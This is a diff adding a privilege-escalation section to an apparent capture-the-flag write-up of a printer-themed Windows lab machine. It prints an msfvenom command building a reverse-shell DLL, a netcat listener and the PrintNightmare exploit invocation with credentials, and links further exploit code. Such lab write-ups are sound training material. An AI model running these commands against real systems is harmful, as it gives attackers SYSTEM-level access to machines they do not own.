@@ -58,4 +58,19 @@ At this point I got access to the user flag.
 
 ## Privilege escalation 
 
+The box is vulnerable to PrintNightmare, which I looked as first as the machine did have a printer theme. I personally used [this](https://github.com/cube0x0/CVE-2021-1675) exploit and pretty much followed the instructions provieded there. So I installed it, generated a a dll using msfvenom as follows:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=12345 -f dll -o test.dll
+```
+I then uploaded this dll using evil-winrm and started a nc listener:
+```
+nc -lvp 12345
+```
+Afterwards I executed the exploit using:
+```
+python3 ./CVE-2021-1675.py ./tony:liltony@10.10.11.106 'C:\Users\tony\Documents\test.dll'
+```
+This gave me system shell and allowed me to read the root flag. After machine retired I watched ippsecs's [walktrough](https://www.youtube.com/watch?v=N2ahkarb-zI). One of the privilege escalations used in the video also is PrintNightmare, but with the [powershell script](https://github.com/JohnHammond/CVE-2021-34527) by John Hammond and Caleb Stewart. However there is a second way to escalate privileges using an exploit for a Rico printer driver for which an metasploit module seems to exist. 
+
+Small sidenote: If you ever want to exploit PrintNightmare on a Windows 2008 system you can use [this](https://github.com/evilashz/CVE-2021-1675-LPE-EXP) exploit. I had problems getting the powershell exploit to run on such a system before and this worked for me.
 
